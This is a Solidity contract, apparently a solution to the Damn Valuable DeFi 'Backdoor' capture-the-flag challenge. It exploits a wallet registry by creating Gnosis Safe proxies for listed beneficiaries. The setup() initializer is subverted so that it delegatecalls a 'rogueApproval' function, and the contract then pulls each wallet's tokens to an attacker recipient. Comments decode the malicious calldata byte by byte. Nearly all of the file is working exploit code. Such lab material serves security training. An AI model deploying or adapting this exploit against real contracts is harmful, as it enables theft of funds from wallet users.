// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";


/**
* Set up some storage items for convenience.
* Also set some constants for the function selectors to clean the code up.
 */
contract RegistryAttack {
    GnosisSafeProxyFactory factory;
    address singleton;
    address registry;
    address dvt; // DamnValuableToken
    address constant nullAddr = address(0);
    bytes4 public constant SETUP_SELECTOR = bytes4(keccak256("setup(address[],uint256,address,bytes,address,address,uint256,address)"));
    bytes4 public constant APPROVAL_SELECTOR = bytes4(keccak256("rogueApproval(address,address)"));


    /**
    * typical constructor to fill in the contract storage
     */
    constructor(address _singleton, address _factory, address _registry, address _dvt) {
        factory = GnosisSafeProxyFactory(_factory);
        singleton = _singleton;
        registry = _registry;
        dvt = _dvt;
    }


    /**
    * Straightforward ERC approve call, called from the context of the
    * safe proxy during its setup. Ergo, the safe is approving the transfer
    * of tokens to the recipient, usually the attacker.
     */
    function rogueApproval(address recipient, address _token) external {
        IERC20(_token).approve(recipient, 10 ether);
    }

    /**
    * Given an array of target beneficiaries and a destination of the stolen tokens,
    * execute the subverted setup() on the Safe via the constructed initializer.
    * Initializer is appended below.
     */
    function attack(address[] calldata beneficiaries, address tokenRecipient) external {

        // Encode the function selector and the arguments for the approval call in 'rogueApproval'
        bytes memory invokeApproval = abi.encodeWithSelector(APPROVAL_SELECTOR, address(this), dvt);

        for(uint i = 0 ; i < beneficiaries.length ; i++) {

            // The target has to be wrapped in an address[], so I can't just pass the 
            // beneficiary at 'i'
            address[] memory _target = new address[](1);
            _target[0] = beneficiaries[i];
            //Prepare the data payload for the call. We're calling setup() inside the Safe.
            // target: the beneficiary we're targeting.
            // Threshold: could be anything, but 1 works
            // to: This contract's address
            // data: call my function 'rogueApproval' with arguments appended
            // junk that doesn't matter, read the comments on Setup() if you want to know.
            bytes memory initializer = abi.encodeWithSelector(SETUP_SELECTOR, _target, 1, address(this), invokeApproval, nullAddr, nullAddr, 0, nullAddr);
            GnosisSafeProxy proxy = factory.createProxyWithCallback(singleton, initializer, 0, IProxyCreationCallback(registry));
            IERC20(dvt).transferFrom(address(proxy), tokenRecipient, 10 ether);
        }
    }
    
    /**
    initializer
    0xb63e800d // setup(address[],uint256,address,bytes,address,address,uint256,address)
    0000000000000000000000000000000000000000000000000000000000000000 target/owner (was 0)
    0000000000000000000000000000000000000000000000000000000000000001 threshold (1)
    000000000000000000000000d9145cce52d386f254917e481eb44e9943f39138 address of the delegateCall (deployed contract address)
    0000000000000000000000000000000000000000000000000000000000000100 invokeApproval byte array start offset
    0000000000000000000000000000000000000000000000000000000000000000 null
    0000000000000000000000000000000000000000000000000000000000000000 null
    0000000000000000000000000000000000000000000000000000000000000000 0
    0000000000000000000000000000000000000000000000000000000000000000 null
    0000000000000000000000000000000000000000000000000000000000000044 count of bytes of invokeapproval(68) (two full words + 4 bytes)
    bd402080000000000000000000000000d9145cce52d386f254917e481eb44e99 // function selector + recipient + token address
    43f391380000000000000000000000002247772b13194424010404812bdefd70
    25bffec300000000000000000000000000000000000000000000000000000000
    * So, the initializer is a literal FULL call. And the sub call is 
    * treated exactly the same as any other byte information
     */
     
}
